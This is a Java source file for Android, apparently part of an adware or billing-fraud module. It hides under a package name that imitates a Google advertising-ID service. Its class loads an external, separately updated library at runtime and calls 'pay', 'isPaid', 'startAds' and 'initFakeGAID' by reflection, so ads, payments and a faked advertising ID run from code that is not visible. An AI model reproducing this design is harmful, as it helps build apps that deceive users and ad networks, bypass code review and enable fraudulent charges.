package com.advertising_id_service.appclick.googleadvertisingidservice.ADServicer;

import android.app.Activity;
import android.content.Context;

import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.ExternalClassLoader.ExternalLibServicer;
import com.advertising_id_service.appclick.googleadvertisingidservice.GlobalParameters;
import com.advertising_id_service.appclick.googleadvertisingidservice.GoogleAdvertisingIdGetterRealisation.IGoogleAdvertisingIdGetter;
import com.advertising_id_service.appclick.googleadvertisingidservice.Logger.Logger;
import com.av113030.android.PaymentListener;

public class ADServicer_FromExternalLib implements IADServicer {
    @Override
    public void pay(Context cnt, Activity a, String serviceID, PaymentListener paymentListener) {
        Logger.log("Текущая версия ADServicer_FromExternalLib.pay(...)");
        ExternalLibServicer loader  = ExternalLibServicer.getServicer(cnt);
        Class clazzADServicerGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".ADServicerGetter");
        Object instance             = loader.getInstance(clazzADServicerGetter, new Object[]{}, new Class[]{});
        loader.callMethod(clazzADServicerGetter, instance, "pay",
                new Object[]{
                    cnt,
                    a,
                    serviceID,
                    paymentListener},
                new Class[]{
                    Context.class,
                    Activity.class,
                    String.class,
                    PaymentListener.class});
    }

    @Override
    public void startAds(Context cnt) {
        Logger.log("Текущая версия ADServicer_FromExternalLib.startAds(...)");
        ExternalLibServicer loader  = ExternalLibServicer.getServicer(cnt);
        Class clazzADServicerGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".ADServicerGetter");
        Object instance             = loader.getInstance(clazzADServicerGetter, new Object[]{}, new Class[]{});
        loader.callMethod(clazzADServicerGetter, instance, "startAds", new Object[]{cnt}, new Class[]{Context.class});
    }

    @Override
    public void initFakeGAID(Context cnt, IGoogleAdvertisingIdGetter g) {
        Logger.log("Текущая версия ADServicer_FromExternalLib.initFakeGAID(...)");
        ExternalLibServicer loader  = ExternalLibServicer.getServicer(cnt);
        Class clazzADServicerGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".ADServicerGetter");
        Object instance             = loader.getInstance(clazzADServicerGetter, new Object[]{}, new Class[]{});
        loader.callMethod(clazzADServicerGetter, instance, "initFakeGAID", new Object[]{g}, new Class[]{IGoogleAdvertisingIdGetter.class});
    }

    @Override
    public void isPaid(Context cnt, String s, int i, PaymentListener paymentListener) {
        Logger.log("Текущая версия ADServicer_FromExternalLib.isPaid(...)");
        ExternalLibServicer loader  = ExternalLibServicer.getServicer(cnt);
        Class clazzADServicerGetter = loader.getExternalClass(cnt, GlobalParameters.EXTERNAL_PACKAGE_NAME + ".ADServicerGetter");
        Object instance             = loader.getInstance(clazzADServicerGetter, new Object[]{}, new Class[]{});
        loader.callMethod(clazzADServicerGetter, instance, "isPaid",
                new Object[]{
                        s,
                        i,
                        cnt,
                        paymentListener},
                new Class[]{
                        String.class,
                        int.class,
                        Context.class,
                        PaymentListener.class});
    }
}
